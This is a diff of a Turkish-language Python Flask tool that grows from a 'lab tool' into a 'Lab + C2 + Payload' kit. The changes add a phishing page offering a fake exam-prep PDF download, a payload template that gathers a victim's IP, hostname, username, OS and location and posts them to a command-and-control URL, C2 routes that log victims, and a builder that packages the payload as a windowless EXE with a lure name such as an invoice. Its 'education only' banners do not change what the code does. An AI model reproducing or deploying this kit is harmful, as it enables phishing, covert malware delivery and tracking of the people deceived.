@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-╔══════════════════════════════════════════════════════════════════╗
-║     ULTIMATE LABORATUVAR ARACI - TEK DOSYA (v3.0)               ║
-║     Sadece eğitim ve izole laboratuvar ortamı içindir           ║
-║     Telefon + Bilgisayar entegrasyonu                           ║
-╚══════════════════════════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════════════════════════════════╗
+║     ULTIMATE LAB + C2 + PAYLOAD v4.0                                         ║
+║     Tek dosyada: Flask Sunucu + Eğitim Araçları + C2 + Payload Üretici      ║
+║     SADECE EĞİTİM VE İZOLE LABORATUVAR İÇİNDİR                              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
 """
 
 import os
@@ -15,26 +15,29 @@ import socket
 import subprocess
 import webbrowser
 import threading
-import datetime
-import time
 import uuid
+import time
 from datetime import datetime
 
-# Flask ve ek kütüphaneler
+# Kütüphane kontrolü ve yükleme
 try:
     from flask import Flask, render_template_string, send_file, request, jsonify
     import requests
 except ImportError:
     print("[!] Gerekli kütüphaneler yükleniyor...")
-    subprocess.run([sys.executable, "-m", "pip", "install", "flask", "requests"])
+    subprocess.run([sys.executable, "-m", "pip", "install", "flask", "requests", "pyinstaller"])
     from flask import Flask, render_template_string, send_file, request, jsonify
     import requests
 
 app = Flask(__name__)
 DOWNLOAD_FOLDER = "downloads"
+PAYLOAD_FOLDER = "payloads"
+LOG_FOLDER = "logs"
 os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
+os.makedirs(PAYLOAD_FOLDER, exist_ok=True)
+os.makedirs(LOG_FOLDER, exist_ok=True)
 
-# ==================== TELEFON İÇİN SAHTE PDF SAYFASI ====================
+# ==================== TELEFON İÇİN SAHTE SAYFA ====================
 PHISHING_PAGE = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -73,12 +76,7 @@ PHISHING_PAGE = """
             text-align: center;
         }
         .header h1 { font-size: 28px; margin-bottom: 10px; }
-        .header p { font-size: 14px; opacity: 0.9; }
         .content { padding: 30px; text-align: center; }
-        .pdf-icon {
-            font-size: 80px;
-            margin-bottom: 20px;
-        }
         .info-box {
             background: #f0fdf4;
             border-left: 4px solid #22c55e;
@@ -87,7 +85,6 @@ PHISHING_PAGE = """
             margin: 20px 0;
             text-align: left;
         }
-        .info-box p { margin: 5px 0; color: #166534; }
         button {
             background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
             color: white;
@@ -97,19 +94,10 @@ PHISHING_PAGE = """
             font-weight: bold;
             border-radius: 50px;
             cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
             width: 100%;
         }
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
-        }
-        button:active { transform: translateY(0); }
-        .warning {
-            font-size: 11px;
-            color: #999;
-            margin-top: 20px;
-        }
+        button:hover { transform: translateY(-2px); }
+        .warning { font-size: 11px; color: #999; margin-top: 20px; }
     </style>
 </head>
 <body>
@@ -119,53 +107,92 @@ PHISHING_PAGE = """
             <p>Full PDF - Konu Anlatımı + Soru Bankası</p>
         </div>
         <div class="content">
-            <div class="pdf-icon">📄📚</div>
             <div class="info-box">
                 <p>✅ 500+ Sayfa</p>
                 <p>✅ Tüm konular özet</p>
                 <p>✅ 2000+ çözümlü soru</p>
-                <p>✅ Akıllı tahta uyumlu</p>
             </div>
             <form action="/indir" method="POST">
-                <button type="submit">📥 PDF'i Hemen İndir (EXE)</button>
+                <button type="submit">📥 PDF'i Hemen İndir</button>
             </form>
-            <p class="warning">⚠️ Bu dosya sadece laboratuvar test içindir. Gerçek içerik değildir.</p>
+            <p class="warning">⚠️ Laboratuvar test dosyası - Gerçek PDF değildir</p>
         </div>
     </div>
 </body>
 </html>
 """
 
-# ==================== TELEFONA İNECEK TEST DOSYASI ====================
-TEST_DOSYA_KODU = '''
-import tkinter as tk
-from tkinter import messagebox
-import platform
+# ==================== PAYLOAD KODU (Hedefe gönderilecek) ====================
+PAYLOAD_TEMPLATE = '''
+import requests
 import socket
+import platform
+import os
+import json
+import subprocess
 from datetime import datetime
 
-def main():
-    root = tk.Tk()
-    root.withdraw()
-    
-    bilgi = f"Laboratuvar Test Dosyası\\n\\nCihaz: {platform.system()} {platform.release()}\\nHostname: {socket.gethostname()}\\nTarih: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n\\nBu bir eğitim testidir.\\nHiçbir veri toplanmamıştır."
-    
-    messagebox.showinfo("🔬 Laboratuvar Test", bilgi)
-    root.destroy()
+C2_URL = "{c2_url}"
+
+def get_ip():
+    try:
+        response = requests.get('https://api.ipify.org', timeout=5)
+        return response.text
+    except:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except:
+            return "IP alinamadi"
+
+def get_location():
+    try:
+        response = requests.get(f'http://ip-api.com/json/{get_ip()}', timeout=5)
+        data = response.json()
+        if data['status'] == 'success':
+            return {{
+                "ulke": data.get('country'),
+                "sehir": data.get('city'),
+                "enlem": data.get('lat'),
+                "boylam": data.get('lon')
+            }}
+    except:
+        pass
+    return {{}}
+
+def bilgi_topla():
+    return {{
+        "timestamp": str(datetime.now()),
+        "ip": get_ip(),
+        "hostname": socket.gethostname(),
+        "user": os.getlogin(),
+        "os": platform.system() + " " + platform.release(),
+        "machine": platform.machine(),
+        "konum": get_location()
+    }}
+
+def raporla():
+    try:
+        bilgi = bilgi_topla()
+        requests.post(C2_URL, json=bilgi, timeout=5)
+        return True
+    except:
+        return False
 
 if __name__ == "__main__":
-    main()
+    raporla()
 '''
 
-# ==================== EĞİTİM ARAÇLARI (BİLGİSAYAR) ====================
+# ==================== EĞİTİM ARAÇLARI SINIFI ====================
 class EgitimAraclari:
     
     @staticmethod
     def ip_konum(ip=None):
-        """IP adresine göre konum bilgisi"""
         if not ip:
             ip = requests.get('https://api.ipify.org').text
-        
         try:
             response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
             data = response.json()
@@ -174,66 +201,51 @@ class EgitimAraclari:
                     "ip": data['query'],
                     "ulke": data['country'],
                     "sehir": data['city'],
-                    "bolge": data['regionName'],
                     "enlem": data['lat'],
                     "boylam": data['lon'],
                     "isp": data['isp'],
-                    "posta_kodu": data['zip'],
                     "zaman_dilimi": data['timezone']
                 }
-            return {"hata": "IP bulunamadı"}
+            return {"hata": "IP bulunamadi"}
         except Exception as e:
             return {"hata": str(e)}
     
     @staticmethod
     def kendi_ip():
-        """Kendi genel IP'ni bul"""
         try:
-            ip = requests.get('https://api.ipify.org').text
-            return ip
+            return requests.get('https://api.ipify.org').text
         except:
-            return "IP alınamadı"
+            return "IP alinamadi"
     
     @staticmethod
     def sim_simulasyonu():
-        """SIM bilgisi simülasyonu (eğitim için)"""
         return {
-            "sim_durumu": "Simülasyon modu - Gerçek SIM verisi alınmamıştır",
-            "mcc_mnc_ornek": "28601 (Türkiye - Turkcell)",
-            "operador_ornek": "Turkcell / Vodafone / Türk Telekom",
-            "telefon_numarasi_ornek": "+90 5XX XXX XX XX",
-            "sim_seri_no_ornek": "8939012345678901234F",
-            "not": "Bu veriler eğitim amaçlı örneklerdir. Gerçek SIM bilgisi için root/jailbreak gerekir."
+            "sim_durumu": "Simülasyon modu",
+            "mcc_mnc_ornek": "28601 (Turkcell)",
+            "operador_ornek": "Turkcell / Vodafone / Turk Telekom",
+            "not": "Bu veriler eğitim amaçlı örneklerdir."
         }
     
     @staticmethod
     def adres_bul(enlem, boylam):
-        """Koordinatlardan adres bulma"""
         try:
             url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={enlem}&lon={boylam}"
             response = requests.get(url, headers={'User-Agent': 'EgitimLab/1.0'})
             data = response.json()
             if 'display_name' in data:
-                return {
-                    "adres": data['display_name'],
-                    "ulke": data.get('address', {}).get('country', ''),
-                    "sehir": data.get('address', {}).get('city', data.get('address', {}).get('town', '')),
-                    "cadde": data.get('address', {}).get('road', '')
-                }
-            return {"hata": "Adres bulunamadı"}
+                return {"adres": data['display_name']}
+            return {"hata": "Adres bulunamadi"}
         except Exception as e:
             return {"hata": str(e)}
     
     @staticmethod
-    def port_tara(hedef, portlar=[80, 443, 22, 21, 8080]):
-        """Basit port tarama (eğitim amaçlı)"""
+    def port_tara(hedef, portlar=[80, 443, 22, 21, 8080, 3306, 3389]):
         acik_portlar = []
         for port in portlar:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(0.5)
-                sonuc = sock.connect_ex((hedef, port))
-                if sonuc == 0:
+                if sock.connect_ex((hedef, port)) == 0:
                     acik_portlar.append(port)
                 sock.close()
             except:
@@ -242,81 +254,201 @@ class EgitimAraclari:
     
     @staticmethod
     def dns_sorgula(domain):
-        """DNS sorgulama"""
         try:
-            ip = socket.gethostbyname(domain)
-            return {"domain": domain, "ip": ip}
+            return {"domain": domain, "ip": socket.gethostbyname(domain)}
         except:
-            return {"hata": "DNS çözümlenemedi"}
+            return {"hata": "DNS cozulemedi"}
+    
+    @staticmethod
+    def ping_test(hedef):
+        try:
+            param = '-n' if os.name == 'nt' else '-c'
+            result = subprocess.run(['ping', param, '1', hedef], capture_output=True, text=True, timeout=3)
+            return {"hedef": hedef, "durum": "basarili" if result.returncode == 0 else "basarisiz"}
+        except:
+            return {"hata": "Ping basarisiz"}
     
     @staticmethod
     def whois_sorgula(domain):
-        """Basit whois sorgusu (eğitim)"""
         try:
             result = subprocess.run(['whois', domain], capture_output=True, text=True, timeout=3)
             return {"whois": result.stdout[:500] + "..." if len(result.stdout) > 500 else result.stdout}
         except:
-            return {"hata": "whois komutu çalıştırılamadı"}
-    
-    @staticmethod
-    def ping_test(hedef):
-        """Ping testi"""
-        try:
-            param = '-n' if os.name == 'nt' else '-c'
-            result = subprocess.run(['ping', param, '1', hedef], capture_output=True, text=True, timeout=3)
-            return {"hedef": hedef, "durum": "başarılı" if result.returncode == 0 else "başarısız"}
-        except:
-            return {"hata": "Ping başarısız"}
+            return {"hata": "whois calistirilamadi"}
+
+egitim = EgitimAraclari()
+
+# ==================== C2 VERİ DEPOLAMA ====================
+hedef_listesi = []
 
 # ==================== FLASK ROTALARI ====================
+
 @app.route('/')
 def index():
-    """Telefon için sahte PDF indirme sayfası"""
+    """Telefon için sahte sayfa"""
     return render_template_string(PHISHING_PAGE)
 
 @app.route('/indir', methods=['POST'])
 def indir():
-    """Telefona test dosyası indirme"""
+    """Telefona test dosyası indir (masum test için)"""
+    test_kodu = '''
+import tkinter as tk
+from tkinter import messagebox
+import platform
+import socket
+from datetime import datetime
+
+root = tk.Tk()
+root.withdraw()
+messagebox.showinfo("Laboratuvar Test", f"Cihaz: {platform.system()}\\nBu bir eğitim testidir.")
+root.destroy()
+'''
     temp_py = os.path.join(DOWNLOAD_FOLDER, f"test_{uuid.uuid4().hex}.py")
-    with open(temp_py, "w", encoding="utf-8") as f:
-        f.write(TEST_DOSYA_KODU)
-    
-    exe_name = "TYT_Biyoloji_Kampi_Full_PDF.exe"
-    output_exe = os.path.join(DOWNLOAD_FOLDER, exe_name)
+    with open(temp_py, "w") as f:
+        f.write(test_kodu)
     
     try:
         subprocess.run([
             "pyinstaller", "--onefile", "--noconsole",
-            "--name", "TYT_Biyoloji_Kampi_Full_PDF",
+            "--name", "TYT_Biyoloji_Kampi",
             "--distpath", DOWNLOAD_FOLDER,
             "--workpath", "/tmp/build",
             "--specpath", "/tmp/spec",
             temp_py
         ], capture_output=True, timeout=30)
         
-        built_exe = os.path.join(DOWNLOAD_FOLDER, "TYT_Biyoloji_Kampi_Full_PDF", "TYT_Biyoloji_Kampi_Full_PDF.exe")
-        if os.path.exists(built_exe):
-            os.rename(built_exe, output_exe)
-        
-        return send_file(output_exe, as_attachment=True, download_name=exe_name)
+        exe_path = os.path.join(DOWNLOAD_FOLDER, "TYT_Biyoloji_Kampi", "TYT_Biyoloji_Kampi.exe")
+        if os.path.exists(exe_path):
+            return send_file(exe_path, as_attachment=True, download_name="TYT_Biyoloji_Kampi.exe")
+        return "Dosya oluşturuldu ancak bulunamadı"
     except Exception as e:
-        return f"Dosya oluşturulamadı: {e}"
+        return f"Hata: {e}"
     finally:
         if os.path.exists(temp_py):
             os.remove(temp_py)
 
-# ==================== BİLGİSAYAR ARAYÜZÜ (HTML) ====================
+# ==================== C2 API ROTALARI ====================
+@app.route('/c2/report', methods=['POST'])
+def c2_report():
+    """Hedeften gelen bilgileri al"""
+    data = request.json
+    data["received_at"] = str(datetime.now())
+    hedef_listesi.append(data)
+    
+    # Log dosyasına kaydet
+    with open(os.path.join(LOG_FOLDER, "hedefler.json"), "a") as f:
+        f.write(json.dumps(data) + "\n")
+    
+    print(f"""
+╔════════════════════════════════════════════════════════════╗
+║  🎯 YENİ HEDEF BİLGİSİ GELDİ!                             ║
+╠════════════════════════════════════════════════════════════╣
+║  📡 IP: {data.get('ip', '?')}
+║  💻 Hostname: {data.get('hostname', '?')}
+║  👤 Kullanıcı: {data.get('user', '?')}
+║  🖥️  OS: {data.get('os', '?')}
+║  📍 Konum: {data.get('konum', {}).get('sehir', '?')}
+║  🕒 Zaman: {data.get('timestamp', '?')}
+╚════════════════════════════════════════════════════════════╝
+    """)
+    
+    return jsonify({"status": "ok"})
+
+@app.route('/c2/hedefler', methods=['GET'])
+def c2_hedefler():
+    """Tüm hedef IP'leri göster (JSON)"""
+    return jsonify(hedef_listesi)
+
+@app.route('/c2/hedefler_html', methods=['GET'])
+def c2_hedefler_html():
+    """Hedefleri HTML olarak göster"""
+    html = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>C2 - Hedef Listesi</title>
+        <style>
+            body { font-family: monospace; background: #1a1a2e; color: white; padding: 20px; }
+            table { width: 100%; border-collapse: collapse; }
+            th, td { border: 1px solid #333; padding: 10px; text-align: left; }
+            th { background: #00ff88; color: #1a1a2e; }
+            tr:hover { background: #2a2a3e; }
+        </style>
+    </head>
+    <body>
+        <h1>🎯 Hedef Listesi (C2)</h1>
+        <table>
+            <tr><th>IP</th><th>Hostname</th><th>Kullanıcı</th><th>OS</th><th>Konum</th><th>Zaman</th></tr>
+    """
+    for hedef in hedef_listesi:
+        html += f"""
+            <tr>
+                <td>{hedef.get('ip', '?')}</td>
+                <td>{hedef.get('hostname', '?')}</td>
+                <td>{hedef.get('user', '?')}</td>
+                <td>{hedef.get('os', '?')}</td>
+                <td>{hedef.get('konum', {}).get('sehir', '?')}</td>
+                <td>{hedef.get('timestamp', '?')[:19]}</td>
+            </tr>
+        """
+    html += "</table></body></html>"
+    return html
+
+# ==================== PAYLOAD OLUŞTURUCU API ====================
+@app.route('/payload/olustur', methods=['POST'])
+def payload_olustur():
+    """Özel payload oluştur"""
+    data = request.json
+    exe_adi = data.get('exe_adi', 'payload.exe')
+    c2_url = data.get('c2_url', f"http://{egitim.kendi_ip()}:5000/c2/report")
+    
+    # Payload kodunu oluştur
+    payload_kodu = PAYLOAD_TEMPLATE.format(c2_url=c2_url)
+    
+    # Geçici dosya yaz
+    temp_py = os.path.join(PAYLOAD_FOLDER, f"payload_{uuid.uuid4().hex}.py")
+    with open(temp_py, "w", encoding="utf-8") as f:
+        f.write(payload_kodu)
+    
+    # EXE oluştur
+    exe_path = os.path.join(PAYLOAD_FOLDER, exe_adi)
+    try:
+        subprocess.run([
+            "pyinstaller", "--onefile", "--noconsole",
+            "--name", exe_adi.replace(".exe", ""),
+            "--distpath", PAYLOAD_FOLDER,
+            "--workpath", "/tmp/build",
+            "--specpath", "/tmp/spec",
+            temp_py
+        ], capture_output=True, timeout=30)
+        
+        built_exe = os.path.join(PAYLOAD_FOLDER, exe_adi.replace(".exe", ""), exe_adi)
+        if os.path.exists(built_exe):
+            os.rename(built_exe, exe_path)
+        
+        return jsonify({
+            "durum": "basarili",
+            "dosya": exe_path,
+            "c2_url": c2_url
+        })
+    except Exception as e:
+        return jsonify({"durum": "hata", "mesaj": str(e)})
+    finally:
+        if os.path.exists(temp_py):
+            os.remove(temp_py)
+
+# ==================== BİLGİSAYAR ARAYÜZÜ (TEK SAYFA) ====================
 LAB_ARAYUZ = """
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔬 Laboratuvar Eğitim Aracı</title>
+    <title>🔬 Ultimate Lab + C2 v4.0</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', sans-serif;
             background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
             min-height: 100vh;
             color: white;
@@ -326,11 +458,8 @@ LAB_ARAYUZ = """
             padding: 15px 30px;
             display: flex;
             justify-content: space-between;
-            align-items: center;
             flex-wrap: wrap;
         }
-        .navbar h1 { font-size: 24px; }
-        .navbar .info { font-size: 12px; opacity: 0.8; }
         .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
         .grid {
             display: grid;
@@ -362,9 +491,7 @@ LAB_ARAYUZ = """
             border-radius: 8px;
             background: rgba(255,255,255,0.2);
             color: white;
-            font-size: 14px;
         }
-        input::placeholder { color: rgba(255,255,255,0.5); }
         button {
             background: linear-gradient(135deg, #00ff88, #00cc66);
             color: #1a1a2e;
@@ -373,10 +500,8 @@ LAB_ARAYUZ = """
             border-radius: 8px;
             cursor: pointer;
             font-weight: bold;
-            transition: all 0.2s;
             width: 100%;
         }
-        button:hover { transform: scale(1.02); opacity: 0.9; }
         .sonuc {
             background: rgba(0,0,0,0.5);
             border-radius: 10px;
@@ -385,9 +510,21 @@ LAB_ARAYUZ = """
             font-family: monospace;
             font-size: 12px;
             overflow-x: auto;
-            white-space: pre-wrap;
-            word-break: break-all;
         }
+        .tab-menu {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .tab-btn {
+            background: rgba(255,255,255,0.1);
+            width: auto;
+            padding: 10px 20px;
+        }
+        .tab-btn.active { background: #00ff88; color: #1a1a2e; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
         .status {
             position: fixed;
             bottom: 20px;
@@ -397,139 +534,104 @@ LAB_ARAYUZ = """
             border-radius: 20px;
             font-size: 11px;
         }
-        hr { margin: 20px 0; border-color: rgba(255,255,255,0.1); }
-        .footer { text-align: center; padding: 20px; font-size: 12px; opacity: 0.6; }
-        .quick-ip {
-            background: rgba(0,255,136,0.2);
-            border: 1px solid #00ff88;
-        }
     </style>
 </head>
 <body>
     <div class="navbar">
-        <h1>🔬 Laboratuvar Eğitim Aracı v3.0</h1>
-        <div class="info">📡 Telefon Payload: http://<span id="localIp">...</span>:5000 | 🖥️ Eğitim Araçları</div>
+        <h1>🔬 Ultimate Lab + C2 v4.0</h1>
+        <div>📡 C2: /c2/hedefler_html | 🎯 Payload Üretici</div>
     </div>
     <div class="container">
-        <div class="grid">
-            <!-- IP Konum -->
-            <div class="card">
-                <h3>📍 IP Konum Bulma</h3>
-                <input type="text" id="ipInput" placeholder="IP adresi (boş bırakırsanız kendi IP'niz)">
-                <button onclick="ipKonum()">🔍 Konumu Getir</button>
-                <div id="ipSonuc" class="sonuc">Henüz sorgu yapılmadı...</div>
-            </div>
-            
-            <!-- Kendi IP -->
-            <div class="card quick-ip">
-                <h3>🌐 Kendi IP Adresin</h3>
-                <button onclick="kendiIp()">🆔 IP'mi Göster</button>
-                <div id="ipKendiSonuc" class="sonuc">Henüz sorgu yapılmadı...</div>
-            </div>
-            
-            <!-- SIM Simülasyonu -->
-            <div class="card">
-                <h3>📱 SIM Bilgisi (Simülasyon)</h3>
-                <button onclick="simBilgisi()">📲 SIM Bilgilerini Göster</button>
-                <div id="simSonuc" class="sonuc">Henüz sorgu yapılmadı...</div>
-            </div>
-            
-            <!-- Adres Bul -->
-            <div class="card">
-                <h3>🏠 Koordinattan Adres Bul</h3>
-                <input type="text" id="latInput" placeholder="Enlem (örnek: 41.0082)">
-                <input type="text" id="lonInput" placeholder="Boylam (örnek: 28.9784)">
-                <button onclick="adresBul()">📍 Adresi Getir</button>
-                <div id="adresSonuc" class="sonuc">Henüz sorgu yapılmadı...</div>
-            </div>
-            
-            <!-- Port Tarama -->
-            <div class="card">
-                <h3>🔌 Port Tarama</h3>
-                <input type="text" id="portHedef" placeholder="Hedef IP (örn: google.com)">
-                <input type="text" id="portListesi" placeholder="Portlar (örn: 80,443,22)">
-                <button onclick="portTara()">🔍 Tara</button>
-                <div id="portSonuc" class="sonuc">Henüz sorgu yapılmadı...</div>
-            </div>
-            
-            <!-- DNS Sorgula -->
-            <div class="card">
-                <h3>🌍 DNS Sorgula</h3>
-                <input type="text" id="dnsDomain" placeholder="Domain (örn: google.com)">
-                <button onclick="dnsSorgula()">🔎 Sorgula</button>
-                <div id="dnsSonuc" class="sonuc">Henüz sorgu yapılmadı...</div>
-            </div>
-            
-            <!-- Ping Test -->
-            <div class="card">
-                <h3>📡 Ping Testi</h3>
-                <input type="text" id="pingHedef" placeholder="Hedef IP/Domain">
-                <button onclick="pingTest()">🏓 Ping At</button>
-                <div id="pingSonuc" class="sonuc">Henüz sorgu yapılmadı...</div>
-            </div>
-            
-            <!-- Whois -->
-            <div class="card">
-                <h3>📋 Whois Sorgula</h3>
-                <input type="text" id="whoisDomain" placeholder="Domain">
-                <button onclick="whoisSorgula()">🔎 Sorgula</button>
-                <div id="whoisSonuc" class="sonuc">Henüz sorgu yapılmadı...</div>
+        <div class="tab-menu">
+            <button class="tab-btn active" onclick="switchTab('araclar')">🛠️ Eğitim Araçları</button>
+            <button class="tab-btn" onclick="switchTab('c2')">🎯 C2 Hedef Takibi</button>
+            <button class="tab-btn" onclick="switchTab('payload')">🧪 Payload Oluşturucu</button>
+        </div>
+        
+        <!-- Eğitim Araçları Sekmesi -->
+        <div id="araclar" class="tab-content active">
+            <div class="grid">
+                <div class="card"><h3>📍 IP Konum</h3>
+                    <input type="text" id="ipInput" placeholder="IP (boş bırak kendi IP)">
+                    <button onclick="ipKonum()">Sorgula</button>
+                    <div id="ipSonuc" class="sonuc">Hazır</div>
+                </div>
+                <div class="card"><h3>🌐 Kendi IP</h3>
+                    <button onclick="kendiIp()">Göster</button>
+                    <div id="ipKendiSonuc" class="sonuc">Hazır</div>
+                </div>
+                <div class="card"><h3>📱 SIM Simülasyonu</h3>
+                    <button onclick="simBilgisi()">Göster</button>
+                    <div id="simSonuc" class="sonuc">Hazır</div>
+                </div>
+                <div class="card"><h3>🏠 Adres Bul</h3>
+                    <input type="text" id="latInput" placeholder="Enlem">
+                    <input type="text" id="lonInput" placeholder="Boylam">
+                    <button onclick="adresBul()">Bul</button>
+                    <div id="adresSonuc" class="sonuc">Hazır</div>
+                </div>
+                <div class="card"><h3>🔌 Port Tarama</h3>
+                    <input type="text" id="portHedef" placeholder="Hedef IP">
+                    <input type="text" id="portListesi" placeholder="Portlar (örn: 80,443)">
+                    <button onclick="portTara()">Tara</button>
+                    <div id="portSonuc" class="sonuc">Hazır</div>
+                </div>
+                <div class="card"><h3>🌍 DNS Sorgula</h3>
+                    <input type="text" id="dnsDomain" placeholder="Domain">
+                    <button onclick="dnsSorgula()">Sorgula</button>
+                    <div id="dnsSonuc" class="sonuc">Hazır</div>
+                </div>
             </div>
         </div>
         
-        <hr>
-        
-        <div class="card">
-            <h3>📊 Log / Sorgu Geçmişi</h3>
-            <div id="logAlan" class="sonuc" style="max-height: 200px; overflow-y: auto;">Log boş...</div>
-            <button onclick="logTemizle()" style="margin-top: 10px;">🗑️ Log Temizle</button>
+        <!-- C2 Hedef Takibi Sekmesi -->
+        <div id="c2" class="tab-content">
+            <div class="card">
+                <h3>🎯 Gelen Hedefler</h3>
+                <button onclick="hedefListesi()">🔄 Yenile</button>
+                <div id="c2Sonuc" class="sonuc">Henüz hedef yok...</div>
+            </div>
         </div>
         
-        <div class="footer">
-            ⚠️ Bu araç SADECE eğitim ve izole laboratuvar ortamı içindir. Tüm sorgular local olarak kaydedilir.
+        <!-- Payload Oluşturucu Sekmesi -->
+        <div id="payload" class="tab-content">
+            <div class="card">
+                <h3>🧪 Payload Oluşturucu</h3>
+                <input type="text" id="exeAdi" placeholder="EXE adı (örn: Fatura.exe)" value="Fatura_Bilgisi.exe">
+                <input type="text" id="c2Url" placeholder="C2 URL (örn: http://192.168.1.100:5000/c2/report)">
+                <button onclick="payloadOlustur()">⚡ Payload Oluştur</button>
+                <div id="payloadSonuc" class="sonuc">Hazır</div>
+            </div>
+        </div>
+        
+        <div class="footer" style="text-align:center; padding:20px; opacity:0.6;">
+            ⚠️ SADECE EĞİTİM VE İZOLE LABORATUVAR İÇİNDİR
         </div>
     </div>
     <div class="status" id="status">✅ Sistem Hazır</div>
     
     <script>
-        let logList = [];
-        
-        function addLog(text) {
-            const timestamp = new Date().toLocaleTimeString();
-            logList.unshift(`[${timestamp}] ${text}`);
-            if (logList.length > 20) logList.pop();
-            document.getElementById('logAlan').innerHTML = logList.join('<br>');
-        }
-        
         async function apiCall(endpoint, data) {
-            try {
-                const response = await fetch(endpoint, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                return await response.json();
-            } catch(e) {
-                addLog(`❌ Hata: ${e.message}`);
-                return { hata: e.message };
-            }
+            const res = await fetch(endpoint, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            });
+            return await res.json();
         }
         
         async function ipKonum() {
             const ip = document.getElementById('ipInput').value;
-            addLog(`📍 IP konum sorgusu: ${ip || 'kendi IP'}`);
             const result = await apiCall('/api/ip_konum', { ip });
             document.getElementById('ipSonuc').innerHTML = JSON.stringify(result, null, 2);
         }
         
         async function kendiIp() {
-            addLog(`🌐 Kendi IP sorgulanıyor...`);
             const result = await apiCall('/api/kendi_ip', {});
             document.getElementById('ipKendiSonuc').innerHTML = JSON.stringify(result, null, 2);
         }
         
         async function simBilgisi() {
-            addLog(`📱 SIM simülasyonu`);
             const result = await apiCall('/api/sim_simulasyonu', {});
             document.getElementById('simSonuc').innerHTML = JSON.stringify(result, null, 2);
         }
@@ -537,7 +639,6 @@ LAB_ARAYUZ = """
         async function adresBul() {
             const lat = document.getElementById('latInput').value;
             const lon = document.getElementById('lonInput').value;
-            addLog(`🏠 Adres sorgusu: ${lat}, ${lon}`);
             const result = await apiCall('/api/adres_bul', { lat, lon });
             document.getElementById('adresSonuc').innerHTML = JSON.stringify(result, null, 2);
         }
@@ -545,139 +646,104 @@ LAB_ARAYUZ = """
         async function portTara() {
             const hedef = document.getElementById('portHedef').value;
             const portlar = document.getElementById('portListesi').value;
-            addLog(`🔌 Port tarama: ${hedef} - Portlar: ${portlar || 'varsayılan'}`);
             const result = await apiCall('/api/port_tara', { hedef, portlar });
             document.getElementById('portSonuc').innerHTML = JSON.stringify(result, null, 2);
         }
         
         async function dnsSorgula() {
             const domain = document.getElementById('dnsDomain').value;
-            addLog(`🌍 DNS sorgusu: ${domain}`);
             const result = await apiCall('/api/dns_sorgula', { domain });
             document.getElementById('dnsSonuc').innerHTML = JSON.stringify(result, null, 2);
         }
         
-        async function pingTest() {
-            const hedef = document.getElementById('pingHedef').value;
-            addLog(`📡 Ping testi: ${hedef}`);
-            const result = await apiCall('/api/ping_test', { hedef });
-            document.getElementById('pingSonuc').innerHTML = JSON.stringify(result, null, 2);
+        async function hedefListesi() {
+            const res = await fetch('/c2/hedefler');
+            const data = await res.json();
+            document.getElementById('c2Sonuc').innerHTML = JSON.stringify(data, null, 2);
         }
         
-        async function whoisSorgula() {
-            const domain = document.getElementById('whoisDomain').value;
-            addLog(`📋 Whois sorgusu: ${domain}`);
-            const result = await apiCall('/api/whois_sorgula', { domain });
-            document.getElementById('whoisSonuc').innerHTML = JSON.stringify(result, null, 2);
+        async function payloadOlustur() {
+            const exeAdi = document.getElementById('exeAdi').value;
+            let c2Url = document.getElementById('c2Url').value;
+            if (!c2Url) {
+                const ipRes = await apiCall('/api/kendi_ip', {});
+                c2Url = `http://${ipRes.ip}:5000/c2/report`;
+            }
+            const result = await apiCall('/payload/olustur', { exe_adi: exeAdi, c2_url: c2Url });
+            document.getElementById('payloadSonuc').innerHTML = JSON.stringify(result, null, 2);
         }
         
-        function logTemizle() {
-            logList = [];
-            document.getElementById('logAlan').innerHTML = 'Log temizlendi.';
-            addLog('Loglar temizlendi');
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+            event.target.classList.add('active');
         }
         
-        // Local IP gösterimi
-        fetch('/api/kendi_ip')
-            .then(r => r.json())
-            .then(data => {
-                document.getElementById('localIp').innerText = data.ip || '...';
-            });
+        setInterval(hedefListesi, 5000);
+        hedefListesi();
     </script>
 </body>
 </html>
 """
 
 # ==================== API ROTALARI ====================
-egitim = EgitimAraclari()
-
 @app.route('/lab')
 def lab_arayuz():
-    """Bilgisayar için eğitim arayüzü"""
     return render_template_string(LAB_ARAYUZ)
 
 @app.route('/api/ip_konum', methods=['POST'])
 def api_ip_konum():
     data = request.json
-    ip = data.get('ip')
-    result = egitim.ip_konum(ip if ip else None)
-    return jsonify(result)
+    return jsonify(egitim.ip_konum(data.get('ip')))
 
 @app.route('/api/kendi_ip', methods=['POST'])
 def api_kendi_ip():
-    result = {"ip": egitim.kendi_ip()}
-    return jsonify(result)
+    return jsonify({"ip": egitim.kendi_ip()})
 
 @app.route('/api/sim_simulasyonu', methods=['POST'])
 def api_sim():
